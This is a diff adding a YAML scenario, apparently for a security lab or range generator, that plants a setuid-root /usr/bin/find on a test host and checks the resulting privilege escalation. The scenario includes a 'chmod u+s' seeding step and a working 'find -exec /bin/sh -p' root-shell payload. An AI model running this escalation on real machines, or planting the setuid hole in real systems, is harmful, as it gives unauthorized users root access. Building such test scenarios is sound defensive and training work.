@@ -1,0 +1,38 @@
+# T1548.001 — Setuid/Setgid abuse.
+# A setuid-root binary that is outside the distribution baseline AND has a
+# documented GTFOBins shell escape. A container CAN execute this (the setuid bit
+# is a property of a file in its own filesystem), so the verifier walks a
+# complete path to root and proves it.
+id: suid_binary
+title: "Setuid-root binary with a shell escape"
+technique: T1548.001
+executable_in: either
+summary: >-
+  {suid_path} carries the setuid bit and has a documented shell escape, giving
+  {user} a root shell. The escape needs `sh -p` or the inherited euid is dropped.
+
+needs: [account]
+
+params:
+  suid_path: "/usr/bin/find"
+  payload_template: "/usr/bin/find /etc/hostname -exec /bin/sh -p -c 'cat {canary}' \\; -quit"
+
+seed: |
+  chmod u+s {suid_path}
+
+realism: |
+  cat > /usr/local/sbin/nightly-index <<'INDEX'
+  #!/bin/sh
+  # Nightly index of customer records. Runs from cron as root.
+  {suid_path} /var/lib/appdata -type f -newer /etc/hostname
+  INDEX
+  chmod 755 /usr/local/sbin/nightly-index
+
+verify:
+  adapter: config_abuse
+  check: suid_binary
+  scope: local
+  start_user: "{user}"
+  params:
+    suid_path: "{suid_path}"
+    payload_template: "{payload_template}"
